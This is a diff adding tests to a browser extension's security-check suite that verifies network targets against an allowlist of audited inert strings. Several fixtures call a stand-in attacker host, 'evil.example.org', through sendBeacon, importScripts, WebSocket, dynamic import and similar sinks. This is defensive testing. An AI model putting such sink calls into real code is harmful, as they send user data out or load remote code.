@@ -8,7 +8,7 @@ import { tmpdir } from "node:os";
 import path from "node:path";
 import { readZip, writeZip } from "../src/zip.mjs";
 import {
-  checkHosts, checkNoSecrets, checkNoRemoteCode, checkPermissions, checkLicenseKeyEmbedded,
+  checkHosts, validateInertEntries, checkNoSecrets, checkNoRemoteCode, checkPermissions, checkLicenseKeyEmbedded,
   checkDependencyLicenses, licenseForbidden, checkContentScriptsOffline, secretVariants,
   checkNoPageControl, checkPassThroughUnwritable
 } from "../src/security-checks.mjs";
@@ -165,4 +165,62 @@ test("passThrough: only the policy readers may name it, and they may not write i
   assert.equal(checkPassThroughUnwritable(new Map([...ok, ["service-worker.ts", 'if (m.type==="pt") chrome.storage.local.set({ passThrough: true })']])).status, "FAIL");
   assert.equal(checkPassThroughUnwritable(new Map([["sw/settings.ts", "await chrome.storage.local.set({ passThrough: v })"]])).status, "FAIL");
   assert.equal(checkPassThroughUnwritable(new Map([["sw/policy.ts", "settings.passThrough = true"]])).status, "FAIL");
+});
+
+// ---------- V10: network targets vs audited inert strings ----------
+const INERT = [{ string: "https://sola.na/web3invariant", file: "a.js", reason: "error message text" }];
+
+test("hosts: an audited inert string passes; the same string unlisted, or listed for another file, fails", () => {
+  const src = 'm={[1]:"please file an issue at https://sola.na/web3invariant"}';
+  assert.equal(checkHosts(bundle({ "a.js": src }), INERT).status, "PASS");
+  assert.equal(checkHosts(bundle({ "a.js": src }), []).status, "FAIL");
+  assert.equal(checkHosts(bundle({ "b.js": src }), INERT).status, "FAIL");
+  // exact string: a longer URL on the same host is a different occurrence
+  assert.equal(checkHosts(bundle({ "a.js": '"https://sola.na/web3invariant/x"' }), INERT).status, "FAIL");
+});
+
+test("hosts: an allowlisted string that reaches a network sink fails", () => {
+  for (const s of ['fetch("https://sola.na/web3invariant")', 'const u="https://sola.na/web3invariant";fetch(u)',
+    'fetch(new URL("/x","https://sola.na/web3invariant"))', 'const b="https://sola.na/web3invariant";fetch(`${b}/x`)',
+    'let f=e.fetch??globalThis.fetch.bind(globalThis);f("https://sola.na/web3invariant")']) {
+    const r = checkHosts(bundle({ "a.js": s }), INERT);
+    assert.equal(r.status, "FAIL", s);
+    assert.match(r.detail, /reaches/, s);
+  }
+});
+
+test("hosts: every sink kind with a foreign host fails", () => {
+  for (const s of ['new WebSocket("wss://evil.example.org/ws")', 'new EventSource("https://evil.example.org/s")',
+    'importScripts("https://evil.example.org/a.js")', 'navigator.sendBeacon("https://evil.example.org/b",d)',
+    'x=new XMLHttpRequest;x.open("GET","https://evil.example.org/")', 'img.src="https://evil.example.org/p.gif"',
+    'a.setAttribute("href","https://evil.example.org/")', 'location.assign("https://evil.example.org/")',
+    'import("https://evil.example.org/m.js")', 'fetch(`https://${host}/rpc`)']) {
+    const inert = [{ string: (s.match(/(?:https|wss):\/\/[^"`]+/) ?? [""])[0], file: "a.js", reason: "mutant: listed to prove the sink check ignores the list" }];
+    const r = checkHosts(bundle({ "a.js": s }), inert);
+    assert.equal(r.status, "FAIL", s);
+    assert.match(r.detail, /reaches/, s);
+  }
+  assert.equal(checkHosts(bundle({ "r.html": '<img src="https://evil.example.org/p.gif">' }), [{ string: "https://evil.example.org/p.gif", file: "r.html", reason: "mutant" }]).status, "FAIL");
+});
+
+test("hosts: Helius and localhost reach sinks freely", () => {
+  for (const s of ['fetch("https://mainnet.helius-rpc.com/?api-key="+k)', 'fetch(`https://${n}.helius-rpc.com/`)',
+    'new WebSocket("ws://127.0.0.1:8900")', 'const u="http://localhost:8899";fetch(u,{method:"POST"})', 'fetch(e.url)']) {
+    assert.equal(checkHosts(bundle({ "a.js": s }), []).status, "PASS", s);
+  }
+});
+
+test("hosts: allowlist entries must be exact, one-line and complete", () => {
+  for (const e of [{ string: "https://*.example.org", file: "a.js", reason: "x" }, { string: "https://sola.na/web3invariant", file: "*.js", reason: "x" },
+    { string: "https://sola.na/web3invariant", file: "a.js", reason: "" }, { string: "https://sola.na/web3invariant", file: "a.js" }]) {
+    assert.equal(checkHosts(bundle({ "a.js": '"https://sola.na/web3invariant"' }), [e]).status, "FAIL", JSON.stringify(e));
+  }
+  assert.deepEqual(validateInertEntries(INERT), []);
+});
+
+test("hosts: the repo allowlist is well formed", async () => {
+  const { readFileSync } = await import("node:fs");
+  const list = JSON.parse(readFileSync(new URL("../inert-hosts.json", import.meta.url), "utf8")).entries;
+  assert.ok(list.length > 0);
+  assert.deepEqual(validateInertEntries(list), []);
 });
